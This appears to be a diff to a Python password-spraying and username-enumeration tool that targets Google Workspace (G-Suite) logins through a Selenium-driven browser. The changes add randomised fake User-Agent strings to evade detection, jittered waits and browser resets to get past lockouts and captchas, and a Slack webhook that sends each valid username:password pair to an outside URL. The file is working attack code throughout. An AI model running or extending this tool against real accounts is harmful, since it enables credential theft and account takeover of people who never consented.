@@ -23,12 +23,17 @@
 
 """A basic username enumeration and password spraying tool aimed at
 G-Suite's DOM based authentication."""
+import requests
 
 from random import randrange
 from sys import exit
 from time import sleep
 from argparse import ArgumentParser
 from collections import OrderedDict
+
+# Fake User-Agents
+from random_user_agent.user_agent import UserAgent
+from random_user_agent.params import SoftwareName, HardwareType, SoftwareType, OperatingSystem
 
 # Import selenium packages
 from selenium.webdriver import Chrome
@@ -73,22 +78,66 @@ class text_colors:
     reset = "\033[0m"
 
 
+# Class for slack webhook
+class SlackWebhook:
+    def __init__(self, webhook_url):
+        self.webhook_url = webhook_url
+
+    # Post a simple update to slack
+    def post(self, text):
+        block = f"```\n{text}\n```"
+        payload = {
+                "blocks": [
+                    {
+                        "type": "section",
+                        "text": {
+                            "type": "mrkdwn",
+                            "text": block
+                        }
+                    }
+                ]
+            }
+        status = self.__post_payload(payload)
+        return status
+
+    # Post a json payload to slack webhook URL
+    def __post_payload(self, payload):
+        response = requests.post(self.webhook_url, json=payload)
+        if response.status_code != 200:
+            print("%s[Error] %s%s" % (text_colors.red,
+                "Could not send notification to Slack", text_colors.reset))
+
+
+
+# Main class
 class BrowserEngine:
 
     options = Options()
     driver_path = ChromeDriverManager(log_level=0).install()
     # Set preferences at the class level
     options.add_argument("--incognito")
-    options.add_argument("--lang=en-US")
+    #options.add_argument("--lang=en-US")
     options.accept_untrusted_certs = True
-
-    def __init__(self, wait=5, proxy=None, headless=False):
+    # Set User-Agent rotator at the class level
+    software_names = [SoftwareName.CHROME.value]
+    software_types = [SoftwareType.WEB_BROWSER.value]
+    hardware_types = [HardwareType.COMPUTER.value]
+    operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]
+    ua_rotator = UserAgent(software_names=software_names,
+            software_types=software_types,
+            hardware_types=hardware_types,
+            operating_systems=operating_systems)
+    def __init__(self, wait=5, proxy=None, headless=False, random_ua=False):
         self.options.headless = headless
         if proxy is not None:
             self.set_proxy(proxy)
         self.driver = Chrome(options=self.options, service=Service(self.driver_path))
         self.driver.set_window_position(0, 0)
         self.driver.set_window_size(1024, 768)
+        if random_ua:
+            self.driver.execute_cdp_cmd('Network.setUserAgentOverride',
+                    {"userAgent": self.ua_rotator.get_random_user_agent()})
+
         self.wait = WebDriverWait(self.driver, wait)
 
     def set_proxy(self, proxy):
@@ -153,28 +202,61 @@ class BrowserEngine:
 # ==========
 # Statistics
 # ==========
-def spray_stats(creds, locked, invalid):
-    print("\n%s\n[*] Password Spraying Stats\n%s" % ("="*27, "="*27))   
-    print("[*] Total Usernames Tested:  %d" % (len(creds) + len(locked) + invalid))
-    print("[*] Valid Accounts:          %d" % len(creds))
-    print("[*] Locked Accounts:         %d" % len(locked))
-    print("[*] Invalid Usernames:       %d" % invalid)
+def spray_stats(creds, locked, invalid, args):
+    stats_text = "\n%s\n[*] Password Spraying Stats\n%s\n" % ("="*27, "="*27)   
+    stats_text += "[*] Total Usernames Tested:  %d\n" % (len(creds) + len(locked) + invalid)
+    stats_text += "[*] Valid Accounts:          %d\n" % len(creds)
+    stats_text += "[*] Locked Accounts:         %d\n" % len(locked)
+    stats_text += "[*] Invalid Usernames:       %d\n" % invalid
+    print(stats_text)
     if len(creds) > 0:
-        print("[+] Writing valid credentials to the file: valid_creds.txt...")
-        with open("valid_creds.txt", 'w') as file_:
+        print(f"[+] Writing valid credentials to the file: {args.output}...")
+        with open(args.output, 'w') as file_:
             for user in creds.keys():
                 file_.write("%s\n" % ("%s:%s" % (user, creds[user])))
+                # Append to text
+                stats_text += "\n%s:%s" % (user, creds[user])
+    if args.slack:
+        webhook = SlackWebhook(args.slack)
+        try:
+            webhook.post(stats_text)
+        except BaseException as e:
+            print("[ERROR] %s" % e)
+        else:
+            print("[*] Webhook message sent")
 
-def enum_stats(valid, invalid):
-    print("\n%s\n[*] Username Enumeration Stats\n%s" % ("="*30, "="*30))
-    print("[*] Total Usernames Tested:  %d" % (len(valid) + invalid))
-    print("[*] Valid Usernames:         %d" % len(valid))
-    print("[*] Invalid Usernames:       %d" % invalid)
+
+def enum_stats(valid, invalid, args):
+    stats_text = "\n%s\n[*] Username Enumeration Stats\n%s\n" % ("="*30, "="*30)
+    stats_text += "[*] Total Usernames Tested:  %d\n" % (len(valid) + invalid)
+    stats_text += "[*] Valid Usernames:         %d\n" % len(valid)
+    stats_text += "[*] Invalid Usernames:       %d\n" % invalid
+    print(stats_text)
     if len(valid) > 0:
-        print("[+] Writing valid usernames to the file: valid_users.txt...")
-        with open("valid_users.txt", 'w') as file_:
+        print(f"[+] Writing valid usernames to the file: {args.output}...")
+        with open(args.output, 'w') as file_:
             for user in valid:
                 file_.write("%s\n" % user)
+        # Append results to text
+        stats_text += "\n" + "\n".join(valid)
+    if args.slack:
+        webhook = SlackWebhook(args.slack)
+        try:
+            webhook.post(stats_text)
+        except BaseException as e:
+            print("[ERROR] %s" % e)
+        else:
+            print("[*] Webhook message sent")
+
+
+# =========================
+# General helpers
+# =========================
+def wait(delay, jitter):
+    if jitter == 0:
+        sleep(delay)
+    else:
+        sleep(delay + randrange(jitter))
 
 
 # =========================
@@ -197,9 +279,10 @@ def lockout_reset_wait(lockout):
     print("[*] Sleeping for %.1f minutes" % (lockout))
     sleep(lockout * 60)
 
-def reset_browser(browser, wait, proxy, headless):
+def reset_browser(browser, wait, proxy, headless, random_ua):
     browser.quit()
-    return BrowserEngine(wait=wait, proxy=proxy)
+    return BrowserEngine(wait=wait, proxy=proxy,
+            headless=headless, random_ua=random_ua)
 
 
 # Username enumeration
@@ -208,9 +291,14 @@ def enum(args, username_list):
     invalid = 0
     counter = 0
     browser = BrowserEngine(wait=args.wait, proxy=args.proxy,
-            headless=args.headless)
+            headless=args.headless, random_ua=args.rua)
 
     for username in username_list:
+        # Handle browser resets after every given username attempts
+        if counter == args.reset_after:
+            browser = reset_browser(browser, args.wait,
+                    args.proxy, args.headless, args.rua) # Reset the browser to deal with latency issues
+            counter = 0
 
         counter += 1
 
@@ -231,7 +319,6 @@ def enum(args, username_list):
                 if retry == 5:
                     print("[ERROR] %s" % e)
                     exit(1)
-                pass
 
         # Populate the username field and click 'Next'
         element = elements["username"]
@@ -239,6 +326,7 @@ def enum(args, username_list):
         if not usernamefield:
             print("%s[Error] %s%s" % (text_colors.red, "Username field not found",
                     text_colors.reset))
+            continue
         else:
             browser.populate_element(usernamefield, username)
 
@@ -250,7 +338,7 @@ def enum(args, username_list):
             print("[ERROR] %s" % e)
             continue
 
-        sleep(args.wait + randrange(args.jitter)) # Ensure the previous DOM is stale
+        wait(args.wait, args.jitter) # Ensure the previous DOM is stale
         # Check if captcha was activated
         element = elements["captcha"]
         element_pwd = elements["password"]
@@ -284,15 +372,8 @@ def enum(args, username_list):
             print("%s[Found] %s%s" % (text_colors.green, username, text_colors.reset))
             valid.append(username)
 
-
-        # Handle browser resets after every given username attempts
-        if counter == args.reset_after:
-            browser = reset_browser(browser, args.wait,
-                    args.proxy, args.headless) # Reset the browser to deal with latency issues
-            counter = 0
-
     browser.quit()
-    enum_stats(valid, invalid)
+    enum_stats(valid, invalid, args)
 
 
 # Password spray
@@ -303,7 +384,7 @@ def spray(args, username_list, password_list):
     counter = 0
     last_index = len(password_list) - 1
     browser = BrowserEngine(wait=args.wait, proxy=args.proxy,
-            headless=args.headless)
+            headless=args.headless, random_ua=args.rua)
 
     for index, password in enumerate(password_list):
 
@@ -313,7 +394,7 @@ def spray(args, username_list, password_list):
 
             if counter >= args.reset_after:
                 browser = reset_browser(browser, args.wait,
-                        args.proxy, args.headless) # Reset the browser to deal with latency issues
+                        args.proxy, args.headless, args.rua) # Reset the browser to deal with latency issues
                 counter = 0
 
 
@@ -355,7 +436,7 @@ def spray(args, username_list, password_list):
                 print("[ERROR] %s" % e)
                 continue
 
-            sleep(args.wait + randrange(args.jitter)) # Ensure the previous DOM is stale
+            wait(args.wait, args.jitter) # Ensure the previous DOM is stale
 
             # Check if captcha was activated
             element = elements["captcha"]
@@ -377,7 +458,7 @@ def spray(args, username_list, password_list):
                         username, text_colors.reset))
                     continue
 
-            sleep(args.wait + randrange(args.jitter)) # Ensure the previous DOM is stale
+            wait(args.wait, args.jitter) # Ensure the previous DOM is stale
    
             # Handle invalid usernames
             element = elements["password"]
@@ -395,7 +476,7 @@ def spray(args, username_list, password_list):
                 browser.populate_element(pwdfield, password, True)
                 #browser.click(browser.is_clickable(elements["type"], elements["button_next"]))
 
-                sleep(args.wait + randrange(args.jitter)) # Ensure the previous DOM is stale
+                wait(args.wait, args.jitter) # Ensure the previous DOM is stale
 
                 # TODO: Check if account is locked out
                 #if browser.find_element(elements["type"], elements["locked"]):
@@ -409,6 +490,10 @@ def spray(args, username_list, password_list):
                     creds[username] = password
                     # Remove user from list
                     username_list.remove(username)
+                    # Send notification
+                    if args.slack:
+                        notify = SlackWebhook(args.slack)
+                        notify.post(f"Valid creds for {args.target}:\n{username}:{password}")
 
                 else:
                     print("%s[Invalid Creds] %s:%s%s" % (text_colors.red, username, password, text_colors.reset))
@@ -420,7 +505,7 @@ def spray(args, username_list, password_list):
             lockout_reset_wait(args.lockout)
 
     browser.quit()
-    spray_stats(creds, locked, invalid)
+    spray_stats(creds, locked, invalid, args)
 
 
 
@@ -487,6 +572,11 @@ if __name__ == "__main__":
     parser.add_argument("--jitter", type=int,
             help="Max jitter (in seconds) to be added to wait time (default: %(default)s)",
             default=0, required=False)
+    parser.add_argument("--slack", type=str,
+            help="Slack webhook for sending notifications (default: %(default)s)",
+            default=None, required=False)
+    parser.add_argument("--rua", action="store_true",
+            help="Use random user-agent", required=False)
     parser.add_argument("-v", "--verbose", action="store_true",
             help="Verbose output", required=False)
 
@@ -518,8 +608,9 @@ if __name__ == "__main__":
     args = parser.parse_args()
 
     assert args.reset_after > 0
+    assert args.wait >= 0
+    assert args.jitter >= 0
     if args.cmd == "spray":
-        assert args.wait >= 0
         assert args.lockout >= 0
 
 
